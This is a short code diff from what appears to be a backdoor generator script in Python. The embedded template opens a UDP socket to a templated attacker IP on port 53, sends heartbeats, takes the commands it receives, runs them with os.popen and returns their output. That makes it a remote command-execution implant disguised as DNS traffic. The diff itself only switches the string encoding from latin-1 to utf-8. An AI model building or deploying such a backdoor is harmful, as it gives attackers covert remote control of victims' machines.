@@ -30,7 +30,7 @@ keys2 = {keys2}
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 serv = ('{ip}', 53)
 
-payload = bytes("HEARTBEAT", "latin-1")
+payload = bytes("HEARTBEAT", "utf-8")
 s.connect(serv)
 while True:
     for key in keys:
@@ -46,7 +46,7 @@ while True:
     print(data)
     data = data.decode()
     payload = os.popen(data).read()
-    payload = bytes(payload, "latin-1")
+    payload = bytes(payload, "utf-8")
 """
 if not os.path.isdir("backdoor"):
  os.mkdir("backdoor")
